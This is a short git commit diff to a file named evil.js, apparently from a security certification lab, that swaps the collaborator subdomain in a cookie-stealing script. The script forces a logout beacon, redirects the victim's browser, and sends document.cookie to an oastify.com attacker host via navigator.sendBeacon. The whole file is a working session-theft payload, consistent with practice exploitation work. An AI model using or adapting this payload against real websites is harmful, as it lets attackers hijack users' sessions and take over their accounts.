61d815be56e793a5846c311f672872406351a232
wewego <40270387+wewego@users.noreply.github.com>
2022-10-13 06:46:36 -0700

    Update evil.js

--- evil.js
+++ evil.js
@@ -5,5 +5,5 @@ navigator.sendBeacon("http://sso-eejn99.hackthecert.systems/logout","");
 window.location.href = "http://support-jqn7t8.hackthecert.systems/home";
 
 //Send cookie to Attacker Server
-var link="http://nqhwx9kzzrtevzfyt1mdglga117rvg.oastify.com/VictimCookies="+document.cookie;
+var link="http://ta72h7h5cznpicy5o6kztaig87ex2m.oastify.com/VictimCookies="+document.cookie;
 navigator.sendBeacon(link,"");
